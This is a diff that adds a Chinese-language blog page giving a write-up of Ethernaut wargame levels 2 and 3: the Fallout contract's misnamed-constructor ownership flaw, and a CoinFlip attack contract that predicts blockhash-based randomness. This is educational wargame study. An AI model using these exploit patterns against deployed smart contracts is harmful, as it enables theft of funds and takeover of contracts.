@@ -1,0 +1,206 @@
+<!DOCTYPE html>
+<html lang="en">
+<style>
+    p{
+        margin-top: 0 !important;
+        margin-bottom: 1rem !important;
+        font-size: 1.1rem;
+    }
+    figure{
+        margin: 0 !important;
+    }
+    pre{
+        padding: 0 !important;
+        margin-top: 0 !important;
+        margin-bottom: 1rem !important;
+    }
+
+    td{
+        padding: 0 !important;
+        margin-bottom: 1rem !important;
+    }
+    h1,h2,h3,h4,h5,h6{
+        margin-top: 0 !important;
+        margin-bottom: 1rem !important;
+    }
+</style>
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Zer0 - Ethernaut-刷题小记（二）</title>
+    <link rel="stylesheet" href="/css/styles.css">
+    <link rel="stylesheet" href="/css/tailwind.css">
+    <link rel="stylesheet" href="/css/highlight.css">
+    <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/prismjs/themes/prism-tomorrow.min.css">
+
+
+<header class="bg-black text-hacker-white py-4 font-dos font-extrabold">
+    <div class="container mx-auto flex items-center justify-between space-x-8">
+    
+      <h1 class="text-2xl font-bold ml-[100px] md:ml-0 animate-pulse text-hacker-color1 md:mr-[20%]">
+        <a href="/" class="hover:text-white transition-colors select-none">
+          Zer0
+        </a>
+      </h1>
+  
+    <!-- 大屏幕 -->
+      <nav class="hidden md:block">
+        <ul class="flex space-x-6">
+          
+            <li>
+              <a href="/" class="select-none text-lg hover:text-hacker-color1 transition-all hover:underline decoration-wavy duration-300 text-hacker-color3">
+                Home
+              </a>
+            </li>
+          
+            <li>
+              <a href="/archives" class="select-none text-lg hover:text-hacker-color1 transition-all hover:underline decoration-wavy duration-300 text-hacker-color3">
+                Archives
+              </a>
+            </li>
+          
+            <li>
+              <a href="/about" class="select-none text-lg hover:text-hacker-color1 transition-all hover:underline decoration-wavy duration-300 text-hacker-color3">
+                About
+              </a>
+            </li>
+          
+            <li>
+              <a href="/link" class="select-none text-lg hover:text-hacker-color1 transition-all hover:underline decoration-wavy duration-300 text-hacker-color3">
+                Friends
+              </a>
+            </li>
+          
+        </ul>
+      </nav>
+  
+      <!-- 小屏幕 -->
+      <button id="menu-toggle" class="block md:hidden text-white focus:outline-none">
+        <svg class="w-6 h-6" fill="none" stroke="currentColor" stroke-width="2" viewBox="0 0 24 24" xmlns="http://www.w3.org/2000/svg">
+          <path stroke-linecap="round" stroke-linejoin="round" d="M4 6h16M4 12h16M4 18h16"></path>
+        </svg>
+      </button>
+    </div>
+  
+    <!-- 折叠菜单 -->
+    <nav id="mobile-menu" class="hidden bg-black">
+      <ul class="space-y-2 py-4 px-6">
+        
+          <li>
+            <a href="/" class="block text-white hover:text-hacker-color1 transition-colors">
+              Home
+            </a>
+          </li>
+        
+          <li>
+            <a href="/archives" class="block text-white hover:text-hacker-color1 transition-colors">
+              Archives
+            </a>
+          </li>
+        
+          <li>
+            <a href="/about" class="block text-white hover:text-hacker-color1 transition-colors">
+              About
+            </a>
+          </li>
+        
+          <li>
+            <a href="/link" class="block text-white hover:text-hacker-color1 transition-colors">
+              Friends
+            </a>
+          </li>
+        
+      </ul>
+    </nav>
+  
+    <!-- RSS Link -->
+    <link rel="alternate" type="application/rss+xml" title=" RSS" href="/rss.xml" />
+  </header>
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/lunr.js/2.3.9/lunr.min.js"></script>
+  <script src="https://code.jquery.com/jquery-3.6.0.min.js"></script>
+  <script src="/js/search.js"></script>
+  <script>
+        document.addEventListener("DOMContentLoaded", () => {
+    const menuToggle = document.getElementById("menu-toggle");
+    const mobileMenu = document.getElementById("mobile-menu");
+
+    menuToggle.addEventListener("click", () => {
+        if (mobileMenu.classList.contains("hidden")) {
+        mobileMenu.classList.remove("hidden");
+        } else {
+        mobileMenu.classList.add("hidden");
+        }
+    });
+    });
+
+  </script>
+  
+
+<meta name="generator" content="Hexo 7.2.0"></head>
+<body class="bg-black text-hacker-color3 container mx-auto">
+    <!-- 文章标题 -->
+    <h1 class="text-5xl text-hacker-color1 font-bold font-dos my-6 text-center">Ethernaut-刷题小记（二）</h1>
+
+    <!-- 发布时间 -->
+    <p class="text-hacker-color3 text-center text-sm mb-4">
+        2025-03-18
+    </p>
+
+    <!-- 文章内容 -->
+    <div id="article-content" class="article-entry prose prose-invert mx-auto max-w-4xl leading-relaxed highlight">
+        <h1 id="Ethernaut刷题小记（二）"><a href="#Ethernaut刷题小记（二）" class="headerlink" title="Ethernaut刷题小记（二）"></a>Ethernaut刷题小记（二）</h1><figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs solidity">// SPDX-License-Identifier: MIT<br>pragma solidity ^0.6.0;<br><br>import &quot;@openzeppelin/contracts/math/SafeMath.sol&quot;;<br><br>contract Fallout &#123;<br>    using SafeMath for uint256;<br><br>    mapping(address =&gt; uint256) allocations;<br>    address payable public owner;<br><br>    /* constructor */<br>    function Fal1out() public payable &#123;<br>        owner = msg.sender;<br>        allocations[owner] = msg.value;<br>    &#125;<br><br>    modifier onlyOwner() &#123;<br>        require(msg.sender == owner, &quot;caller is not the owner&quot;);<br>        _;<br>    &#125;<br><br>    function allocate() public payable &#123;<br>        allocations[msg.sender] = allocations[msg.sender].add(msg.value);<br>    &#125;<br><br>    function sendAllocation(address payable allocator) public &#123;<br>        require(allocations[allocator] &gt; 0);<br>        allocator.transfer(allocations[allocator]);<br>    &#125;<br><br>    function collectAllocations() public onlyOwner &#123;<br>        msg.sender.transfer(address(this).balance);<br>    &#125;<br><br>    function allocatorBalance(address allocator) public view returns (uint256) &#123;<br>        return allocations[allocator];<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure>
+
+<p>第二关没啥东西，就是因为合约名字是<code>Fallout</code>，而构造函数叫做<code>Fal1out</code>，因为这个错误，当合约被部署时，构造函数在创建时从未被执行，owner自然也没有更新，因为<code>Fal1out</code>被当作一个普通函数了，从而我们可以多次调用，并且调用一次，合约所有者就是我们自己了。</p>
+<blockquote>
+<p><em>在 Solidity 0.4.22 之前，为一个合约定义构造函数的唯一方法是定义一个与合约本身同名的函数。</em>    </p>
+<p>在该版本之后，他们引入了一个新的<code>constructor</code>关键字来避免这种错误。*    </p>
+<p><em>在这个例子中，开发者犯了一个错误，把构造函数的名字弄错了。</em>    </p>
+<p><em>Contract name -&gt; Fallout</em>    <em>&#x2F;&#x2F; Constructor name -&gt; Fal1out</em>    <em>&#x2F;&#x2F; 这样做的结果是，合约从未被初始化，所有者是地址(0)</em>    </p>
+<p><em>而且我们能够调用<code>Fal1out</code>函数，在这一点上，它不是一个构造函数（只能调用一次），而是一个 “普通”函数。</em>    </p>
+<p><em>这也意味着任何人都可以多次调用这个函数来切换合约的所有者。</em></p>
+</blockquote>
+<p>通关条件就是拿到owner</p>
+<p>接着开始第三关</p>
+<figure class="highlight json"><table><tr><td class="code"><pre><code class="hljs json"><span class="hljs-comment">// SPDX-License-Identifier: MIT</span><br>pragma solidity ^<span class="hljs-number">0.8</span><span class="hljs-number">.0</span>;<br><br>contract CoinFlip <span class="hljs-punctuation">&#123;</span><br>    uint256 public consecutiveWins;<br>    uint256 lastHash;<br>    uint256 FACTOR = <span class="hljs-number">57896044618658097711785492504343953926634992332820282019728792003956564819968</span>;<br><br>    constructor() <span class="hljs-punctuation">&#123;</span><br>        consecutiveWins = <span class="hljs-number">0</span>;<br>    <span class="hljs-punctuation">&#125;</span><br><br>    function flip(bool _guess) public returns (bool) <span class="hljs-punctuation">&#123;</span><br>        uint256 blockValue = uint256(blockhash(block.number - <span class="hljs-number">1</span>));<br><br>        if (lastHash == blockValue) <span class="hljs-punctuation">&#123;</span><br>            revert();<br>        <span class="hljs-punctuation">&#125;</span><br><br>        lastHash = blockValue;<br>        uint256 coinFlip = blockValue / FACTOR;<br>        bool side = coinFlip == <span class="hljs-number">1</span> ? <span class="hljs-literal"><span class="hljs-keyword">true</span></span> <span class="hljs-punctuation">:</span> <span class="hljs-literal"><span class="hljs-keyword">false</span></span>;<br><br>        if (side == _guess) <span class="hljs-punctuation">&#123;</span><br>            consecutiveWins++;<br>            return <span class="hljs-literal"><span class="hljs-keyword">true</span></span>;<br>        <span class="hljs-punctuation">&#125;</span> else <span class="hljs-punctuation">&#123;</span><br>            consecutiveWins = <span class="hljs-number">0</span>;<br>            return <span class="hljs-literal"><span class="hljs-keyword">false</span></span>;<br>        <span class="hljs-punctuation">&#125;</span><br>    <span class="hljs-punctuation">&#125;</span><br><span class="hljs-punctuation">&#125;</span><br></code></pre></td></tr></table></figure>
+
+<p>分析合约</p>
+<p>我们需要连续猜对十次硬币的正反面才能通关</p>
+<p>通过分析合约可以确定<code>_guess=uint256(blockhash(block.number.sub(1))).div(57896044618658097711785492504343953926634992332820282019728792003956564819968)</code>，那我们不就已经知道怎么去预测了吗，取当前区块的 <strong>前一个区块</strong>（<code>block.number - 1</code>）的 <strong>哈希值</strong>，并将其转换成 <code>uint256</code> 类型。使用 <code>blockhash(block.number - 1)</code> 生成<strong>随机性</strong></p>
+<p>直接上攻击代码（代码来自9C±Void师傅）</p>
+<figure class="highlight json"><table><tr><td class="code"><pre><code class="hljs json"><span class="hljs-comment">/// SPDX-License-Identifier: MIT</span><br>pragma solidity ^<span class="hljs-number">0.8</span><span class="hljs-number">.0</span>;<br>import &#x27;./Level3.sol&#x27;;<br><br>contract CoinFlipAttack<span class="hljs-punctuation">&#123;</span><br>    address target_addr;<br>    uint256 FACTOR = <span class="hljs-number">57896044618658097711785492504343953926634992332820282019728792003956564819968</span>;<br>    uint256 lastHash;<br><br>    constructor()<span class="hljs-punctuation">&#123;</span><br>        target_addr = 攻击合约地址;<br>    <span class="hljs-punctuation">&#125;</span><br>    function attack() public<span class="hljs-punctuation">&#123;</span><br>        uint256 blockValue = uint256(blockhash(block.number<span class="hljs-number">-1</span>));<br><br>        lastHash = blockValue;<br>        uint256 coinFlipResult = blockValue / FACTOR;<br>        bool side = coinFlipResult == <span class="hljs-number">1</span> ? <span class="hljs-literal"><span class="hljs-keyword">true</span></span> <span class="hljs-punctuation">:</span> <span class="hljs-literal"><span class="hljs-keyword">false</span></span>;<br><br>        CoinFlip(target_addr).flip(side);<br>    <span class="hljs-punctuation">&#125;</span><br><span class="hljs-punctuation">&#125;</span><br></code></pre></td></tr></table></figure>
+
+<blockquote>
+<ol>
+<li>区块链上的所有东西都是公开的，即便是像 “lastHash “和 “FACTOR “这样的私有变量；</li>
+<li>区块链中没有真正的 “原生” 随机性，而只有 “伪随机性”。</li>
+</ol>
+</blockquote>
+<p><del>一开始我是写了一个循环的，但是发现需要停几秒,因为要等<code>lastHash = blockValue</code>，但是合约代码是没有暂停这个功能的,只能作罢</del></p>
+
+    </div>
+
+    <!-- 返回主页链接 -->
+    <div class="text-center my-8">
+        <a href="/" class="text-hacker-color1 underline hover:text-hacker-color2">← Back to Home</a>
+    </div>
+
+    <script src="https://cdn.jsdelivr.net/npm/prismjs/prism.min.js"></script>
+<script>Prism.highlightAll();</script>
+
+
+
+<footer class="bg-black text-gray-400 py-4">
+    <div class="container mx-auto text-center">
+      <p>© <span id="current-year"></span>  Zer0 
+        <br> Powered by <a class="hover:text-white duration-150 hover:underline decoration-slice" target="_blank" rel="noopener" href="https://hexo.io/">Hexo</a> & <a class="hover:text-white duration-150 hover:underline decoration-slice" target="_blank" rel="noopener" href="https://github.com/m310ct/hexo-theme-hexploit">Hexpolit</a></p>
+    </div>
+  </footer>
+  
+  <script> 
+    document.getElementById("current-year").textContent = new Date().getFullYear();
+  </script>
+  
+
+
+</body>
+</html>
